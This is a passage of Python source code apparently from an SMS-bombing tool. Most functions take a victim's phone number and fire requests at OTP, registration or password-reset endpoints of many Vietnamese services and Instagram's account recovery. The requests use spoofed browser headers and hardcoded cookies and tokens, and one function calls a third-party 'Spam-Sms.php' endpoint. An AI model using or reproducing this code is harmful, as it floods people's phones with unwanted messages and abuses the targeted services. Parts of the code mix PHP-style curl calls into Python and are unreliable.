  curlsetopt(ch, CURLINFOHEADEROUT, true)
  curlsetopt(ch, CURLOPTPOST, 1)
  curlsetopt(ch, CURLOPTPOSTFIELDS, postData)
  curlsetopt(ch, CURLOPTHTTPHEADER, headers)
  response = curlexec(ch)
  info = curlgetinfo(ch)
  curlclose(ch)

def GOTADI(phone):
  headers = {
    "Host": "api.gotadi.com",
    "content-length": "44",
    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "accept": "application/json",
    "sec-ch-ua-platform": "\"Android\"",
    "gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
    "content-type": "application/json",
    "origin": "https://www.gotadi.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://www.gotadi.com/",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
  }
  
  postData = {
    "phoneNumber": phone,
    "language": "VI"
  }
  
  data = json.dumps(postData)
  
  response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=data, headers=headers)

def VIETID(phone):
    # perform a GET request to the login page to retrieve the csrf token
    url = 'https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F'
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Accept-Encoding": "gzip, deflate, br"
    }
    csrfget_response = requests.get(url, headers=headers)
    
    if csrfget_response.status_code == 200:
        # extract the csrf token from the response
        csrf = csrfget_response.text.split('name="csrf-token" value="')[1].split('"')[0]

        # post the phone number and the csrf token to the login page to actually log in
        url = 'https://oauth.vietid.net/rb/login'
        payload = {'authenticity_token': csrf, 'phone': phone }
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Referer": "https://oauth.vietid.net/rb/login",
            "Accept-Encoding": "gzip, deflate, br"
        }
        response = requests.post(url, data=payload, headers=headers)
        status_code = response.status_code

def VAMO(phone):
    headers = [
        "Host: vamo.vn",
        "Content-Length: 24",
        "sec-ch-ua: \"Chromium\";v=\"112\", \"Google Chrome\";v=\"112\", \"Not:A-Brand\";v=\"99\"",
        "Accept: application/json, text/plain, */*",
        "Content-Type: application/json",
        "sec-ch-ua-mobile: ?1",
        "User-Agent: Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform: \"Android\"",
        "Origin: https://vamo.vn",
        "Sec-Fetch-Site: same-origin",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Dest: empty",
        "Referer: https://vamo.vn/app/login",
        "Accept-Encoding: gzip, deflate, br",
        "Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie: _ga_1HXSGSN1HG=GS1.1.1683203760.3.1.1683203783.0.0.0"
    ]
    data = json.dumps({"username": phone[1:11]})
    options = {
        "http": {
            "method": "POST",
            "header": "\r\n".join(headers),
            "content": data,
        }
    }
    context = ssl._create_unverified_context()
    response = urlopen("https://vamo.vn/ws/api/public/login-with-otp/generate-otp", data=data.encode(), context=context)
    http_response_header = response.info()

def OLDFACEBOOK(phone):
    url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
    data = "email_or_username=" + urllib.parse.quote(phone) + "&recaptcha_challenge_field="
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
        "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
    }
    data = data.encode('utf-8')
    req = urllib.request.Request(url, data=data, headers=headers)
    response = urllib.request.urlopen(req)

def FUNRING(phone):
    headers = {
        "Host": "funring.vn",
        "Connection": "keep-alive",
        "Content-Length": "28",
        "Accept": "/",
        "User-Agent": "Mozilla/5.0 (Linux; Linux x8664; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534",
        "Content-Type": "application/json",
        "Origin": "http://funring.vn",
        "Referer": "http://funring.vn/module/registermobile.jsp",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "JSESSIONID=NODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; ga=GA1.2.1626827841.1679236846; gid=GA1.2.888694467.1679236846; gat=1"
    }
    
    data = {"username": phone}
    response = requests.post("https://funring.vn/api/v1.0.1/jersey/user/getotp", data=data, headers=headers)
def tris(phone):
	response = requests.get(f"https://iamtris.x10.mx/Spam-Sms.php?key=ducknha@123*&phone={phone}")
def BIBABO(phone):
    headers = {
        "Host": "bibabo.vn",
        "Connection": "keep-alive",
        "Content-Length": "64",
        "Accept": "/",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://bibabo.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bibabo.vn/user/signupPhone",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "uibi=eyJpdiI6IlQyam9wWko1MGRQVXNTMnZOZEZpWGc9PSIsInZhbHVlIjoiYjV5SlR1V0tVbjdFNFwvK2FBUzIwbWZWT0YzOUdvR2cyQzZKQXI5OHFKOHM9IiwibWFjIjoiZmFiZWVkOTA0ZmE3NjJkZTRhMzI4MGQ0OWQxMTBjMmZmZjQ2ZTc0ZGYxODhlMmFiNTMwMzVlZjc0Y2MyMTg2NCJ9; ga=GA1.2.55963624.1683002314; gid=GA1.2.593754343.1683002314; mp376a95ebc99b460db45b090a5936c5demixpanel=%7B%22distinctid%22%3A%20%22%24device%3A187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24deviceid%22%3A%20%22187dac14eee542-0abbcdad261932-3a6c1b2b-46500-187dac14eee542%22%2C%22%24initialreferrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2Fhome%22%2C%22%24initialreferringdomain%22%3A%20%22bibabo.vn%22%7D; gat=1; gaVisitorUuid=47008ca1-32a0-4daa-9694-e36807c4dd91; fbp=fb.1.1683002315008.1108739564; XSRF-TOKEN=eyJpdiI6InNtOGtVeHBSZmVoQjR0N1wvRW1hckF3PT0iLCJ2YWx1ZSI6IlNLQ0p3UFlUZGhjdENKSFM1cHdLeXJGcFVGaE1EaDNKa0VRNk40cWo1enFCTERSTVowaEczSzc0WitTNks4am9VcE40KzAzVCtwbUVkeGVZUE1mcER3PT0iLCJtYWMiOiIzYzAxZGZmNzMxOWM3NWExOTY1MmFmYjNkMzhiOGM4OGNhMDQxNmRhZDA4YTY2ZmZhOTNjY2RhN2FiZjZlOTVmIn0%3D; laravelsession=eyJpdiI6Ind5blczNnFrMzRWbTJEbDRVcGNRaXc9PSIsInZhbHVlIjoiZXQyQUJoS3NuTXd4RUljMEhLQUZkS0Q0MEdSdGUrb09PdURXSm03d2xOS2pDRThjbERCUzlyeEpTR3VHTVUxOXd0UTVOVnppXC92WVFyOTZKS240KzBnPT0iLCJtYWMiOiJjMWQ5MWQ5YjdjYTZlODc5MjI2YmNjZTM5YjZlMWVmMThiYmRlMTIzYTI1M2E1YmIzZDc5MDExNGJlODRhYjUwIn0%3D"
    }
    
    payload = {
        "phone": phone,
        "token": "UkkqP4eM9cqQBNTTmbUOJinoUZmcEnSE8wwqJ6VS"
    }    
    response = requests.post("https://bibabo.vn/user/verify-phone", headers=headers, data=payload)    

def moneydong(phone):
    def generate_random_string(length):
        letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.choice(letters) for _ in range(length))

    headers = {
        "Host": "moneydong.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generate_random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + generate_random_string(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneydong.vn/vi/registernew/",
    }

    response = requests.get("https://moneydong.vn/vi/registernew/", headers=headers)
    ck = response.headers["set-cookie"].split(";")[0] + ";"

    data = 'phoneNumber=' + phone

    headers = {
        "Host": "moneydong.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "traceparent": "00-" + generate_random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + generate_random_string(len("1e0ba42c6725b148")) + "-00",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://moneydong.vn/vi/registernew/",
        "cookie": ck
    }

    response = requests.post("https://moneydong.vn/vi/registernew/sendsmsjson/", data=data, headers=headers)    
    
def VAYSIEUDE(phone):
    cookies = {
        'PHPSESSID': 'c4jb1f0n2n77dbr8v9ffeqba3s',
    '_aff_network': 'accesstrade',
    '_aff_sid': '5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4',
    '_AFFI_TRACK_': '5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4',
    '_AFFI_TIME_CUR_': '1695118710',
    '_AFFI_TIME_ACTION_': '1695118710',
    '_AFFI_TRACK_INDEX_': '5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4',
    '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3DBpy7szeD03E%3DRcFkikpuCto%3DAYvUi84bgMY%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DclOzA%2FMBSlk%3De%2F6TbLI9ilY%3DDAbxwA8Cq74%3DXF88psWEUis%3DlxqKpf2ZPM8%3DtCawIVk%2BsM8%3Dv8gN4%2FH1iNc%3DHeYvDQBkHYA%3Dp7QLYc2vzvM%3Dn9M%2BXI5In%2Fg%3DIaEpL8EiB3s%3Dts5N67vwimk%3D',
    '_gcl_aw': 'GCL.1692526698.EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE',
    '__utma': '65249340.1344833277.1692526698.1692526698.1692526698.1',
    '__utmc': '65249340',
    '__utmz': '65249340.1692526698.1.1.utmcsr=accesstrade|utmgclid=EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE|utmccn=(not%20set)|utmcmd=(not%20set)|utmctr=(not%20provided)',
    '_gac_UA-36329013-1': '1.1692526698.EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE',
    '__utmt': '1',
    '_gcl_au': '1.1.680315024.1692526698',
    '_ga': 'GA1.1.980739874.1692526698',
    '_tt_enable_cookie': '1',
    '_ttp': '11nHxV3SBSmoO8ZNc5oJt2c21M0',
    '_fbp': 'fb.1.1692526698731.39326441',
    '__admUTMtime': '1692526698',
    '_aff_network': 'accesstrade',
    '_aff_sid': '5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4',
    '_ga_DFG3FWNPBM': 'GS1.1.1692526698.1.1.1692526701.57.0.0',
    '__utmb': '65249340.2.10.1692526698',
    '_ga_BBD6001M29': 'GS1.1.1692526698.1.1.1692526701.57.0.0',
    '__iid': '',
    '__iid': '',
    '__su': '0',
    '__su': '0',
    '__RC': '21',
    '__R': '1',
    '__uif': '__uid%3A8292526715251642518%7C__ui%3A-1%7C__create%3A1692526715',
    'Srv': 'cc204|ZOHot|ZOHoe',
    }

    headers = {
        'authority': 'concung.com',
    'accept': '*/*',
    'accept-language': 'vi',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=c4jb1f0n2n77dbr8v9ffeqba3s; _aff_network=accesstrade; _aff_sid=5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4; _AFFI_TRACK_=5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4; _AFFI_TIME_CUR_=1695118710; _AFFI_TIME_ACTION_=1695118710; _AFFI_TRACK_INDEX_=5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3DBpy7szeD03E%3DRcFkikpuCto%3DAYvUi84bgMY%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DclOzA%2FMBSlk%3De%2F6TbLI9ilY%3DDAbxwA8Cq74%3DXF88psWEUis%3DlxqKpf2ZPM8%3DtCawIVk%2BsM8%3Dv8gN4%2FH1iNc%3DHeYvDQBkHYA%3Dp7QLYc2vzvM%3Dn9M%2BXI5In%2Fg%3DIaEpL8EiB3s%3Dts5N67vwimk%3D; _gcl_aw=GCL.1692526698.EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE; __utma=65249340.1344833277.1692526698.1692526698.1692526698.1; __utmc=65249340; __utmz=65249340.1692526698.1.1.utmcsr=accesstrade|utmgclid=EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE|utmccn=(not%20set)|utmcmd=(not%20set)|utmctr=(not%20provided); _gac_UA-36329013-1=1.1692526698.EAIaIQobChMI3vHrp4HrgAMVuQl7Bx16yQt-EAAYASAAEgIzfvD_BwE; __utmt=1; _gcl_au=1.1.680315024.1692526698; _ga=GA1.1.980739874.1692526698; _tt_enable_cookie=1; _ttp=11nHxV3SBSmoO8ZNc5oJt2c21M0; _fbp=fb.1.1692526698731.39326441; __admUTMtime=1692526698; _aff_network=accesstrade; _aff_sid=5RHZKAFkgIZ28ecjbXaYMH5gBnyVOKW9ENLGxwUN28Mb0GX4; _ga_DFG3FWNPBM=GS1.1.1692526698.1.1.1692526701.57.0.0; __utmb=65249340.2.10.1692526698; _ga_BBD6001M29=GS1.1.1692526698.1.1.1692526701.57.0.0; __iid=; __iid=; __su=0; __su=0; __RC=21; __R=1; __uif=__uid%3A8292526715251642518%7C__ui%3A-1%7C__create%3A1692526715; Srv=cc204|ZOHot|ZOHoe',
    'origin': 'https://concung.com',
    'referer': 'https://concung.com/dang-nhap.html',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'ajax': '1',
    'classAjax': 'AjaxLogin',
    'methodAjax': 'sendOtpLogin',
    'customer_phone': phone,
    'static_token': 'e633865a31fa27f35b8499e1a75b0a76',
    'id_customer': '0',
    }

    response = requests.post('https://concung.com/ajax.html', cookies=cookies, headers=headers, data=data)
def ONCREDIT(phone):
    cookies = {
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'anhzea.link',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'serverChoice=Server-IPv2',
    'origin': 'https://anhzea.link',
    'referer': 'https://anhzea.link/tools/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'Anhdz',
    }

    response = requests.post('https://anhzea.link/tools/', cookies=cookies, headers=headers, data=data)
def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
def VAYVND(phone):
    head = [
        "Host: api.vayvnd.vn",
        "accept: application/json",
        "accept-language: vi",
        "user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type: application/json",
        "origin: https://vayvnd.vn",
        "referer: https://vayvnd.vn/",
    ]
    data = '''
    {
        "phone": "'''+phone+'''",
        "utm_campaign": "null",
        "cpa_id": 7,
        "cpa_lead_data": {
            "click_id": "''' + generateImei() + '''",
            "source_id": "source_6",
            "utm_score": "0.0'''+generateRandomstr(len("13672266155481339"))+'''"
        },
        "utm_list": [
            {
                "utm_source": "jeffapp"
            }
        ],
        "source_site": 1,
        "reg_screen_resolution": {
            "width": 412,
            "height": 915
        }
    }
    '''
    GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", data, head, false))
def cc1(phone):
	requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
###
def cc2(phone):
	requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone[1:11]})).text
###
def cc3(phone):
	requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
###
def cc4(phone):
	requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text
###
def cc5(phone):
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
###
def cc6(phone):
    cookies = {
        'serverChoice': 'Server-IPv2',
    }

    headers = {
        'authority': 'anhzea.link',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'serverChoice=Server-IPv2',
    'origin': 'https://anhzea.link',
    'referer': 'https://anhzea.link/tools/',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'phone': phone,
    'ten_server': 'Server-IPv2',
    'key': 'Anhdz',
    }

    response = requests.post('https://anhzea.link/tools/', cookies=cookies, headers=headers, data=data)
def cc7(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
